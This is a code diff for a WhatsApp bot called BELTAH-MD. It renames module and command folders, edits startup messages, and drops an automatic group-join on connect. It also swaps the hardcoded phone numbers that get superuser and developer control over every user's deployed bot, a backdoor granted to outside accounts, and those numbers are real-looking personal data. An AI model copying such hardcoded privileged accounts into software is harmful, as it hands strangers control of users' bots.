@@ -76,7 +76,7 @@ const {
   atbverifierEtatJid,
   atbrecupererActionJid
 } = require("./bdd/antibot");
-let evt = require(__dirname + "/keizzah/keith");
+let evt = require(__dirname + "/framework/zokou");
 const {
   isUserBanned,
   addUserToBanList,
@@ -95,7 +95,7 @@ const {
 //const //{loadCmd}=require("/keizzah/mesfonctions")
 let {
   reagir
-} = require(__dirname + "/keizzah/app");
+} = require(__dirname + "/framework/app");
 var session = conf.session.replace(/BELTAH-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE || [];
 
@@ -631,10 +631,10 @@ let lastReactionTime = 0;
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254737681758", '254114141192', '254737681758', "254114141192", '254737681758', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254737681758", '254114141192', '254759328581', "254738625827", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192', '254737681758', "254737681758", '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254114141192', '254737681758', "254759328581", '254738625827'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -1364,7 +1364,7 @@ if (texte && texte.startsWith('>')) {
       if (connection === "connecting") {
         console.log("ℹ️ Beltah md connecting in your account...");
       } else if (connection === 'open') {
-        await zk.groupAcceptInvite("F9eGks0Pnw7JJrozICzBo4");
+        
          console.log("✅ Beltah Md connected successfully✔");
         console.log("--");
         0;
@@ -1373,13 +1373,13 @@ if (texte && texte.startsWith('>')) {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" Beltah-md installing ${evt.cm.length} plugins😇\n\n");
+        console.log(" Beltah-md installing plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
-        fs.readdirSync(__dirname + "/commands").forEach(fichier => {
+        fs.readdirSync(__dirname + "/beltah").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
-              require(__dirname + "/commands/" + fichier);
+              require(__dirname + "/beltah/" + fichier);
               console.log(fichier + "Successfully installed Beltah Md commands✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
@@ -1427,9 +1427,13 @@ if (texte && texte.startsWith('>')) {
           await zk.sendMessage(zk.user.id, {
             text: `*BELTAH-MD* connected successfully ✅
             
-            Please update your bot now to connect latest version 
+     Please update your bot now to connect latest version 
             
-            Use command [  ${prefixe} update ] `
+            Use command :
+            [  ${prefixe} update ]
+            [  ${prefixe} ping ] 
+            [  ${prefixe} menu ]
+            `
           });
         }
       } else if (connection == "close") {
